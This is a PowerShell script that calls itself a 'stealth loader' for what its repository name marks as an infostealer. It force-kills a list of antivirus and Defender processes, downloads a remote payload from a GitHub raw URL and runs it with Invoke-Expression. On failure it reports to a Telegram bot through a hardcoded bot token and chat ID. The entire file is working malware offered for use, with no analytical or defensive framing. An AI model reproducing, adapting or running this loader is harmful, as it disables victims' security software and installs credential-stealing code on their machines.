# ============================================
# FAST LAUNCHER - stealth loader (VISIBLE VERSION)
# ============================================

$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"

# Kill AV processes
$killList = @("avg","avast","avgnt","comodo","kaspersky","malwarebytes","msascui","mbam","nod32","fsecure","sophos","defender")
foreach ($proc in $killList) {
    Get-Process $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}

# Download and execute payload
$url = "https://raw.githubusercontent.com/isajarGamer2/stealer-repo/main/payload_final.ps1"
try {
    Write-Host "[*] Downloading payload from GitHub..." -ForegroundColor Cyan
    $payload = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 15 -UserAgent "Mozilla/5.0" -ErrorAction Stop
    Write-Host "[+] Download complete. Executing..." -ForegroundColor Green
    Invoke-Expression $payload.Content
} catch {
    $errMsg = "Launcher FAILED: $($_.Exception.Message)"
    Write-Host "[-] $errMsg" -ForegroundColor Red
    # Try to send error to Telegram
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
            chat_id = $chatId
            text = $errMsg
        } | Out-Null
    } catch {}
}

# Keep window open so user can see errors
Write-Host ""
Write-Host "[*] Press any key to close..." -ForegroundColor Yellow
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
exit
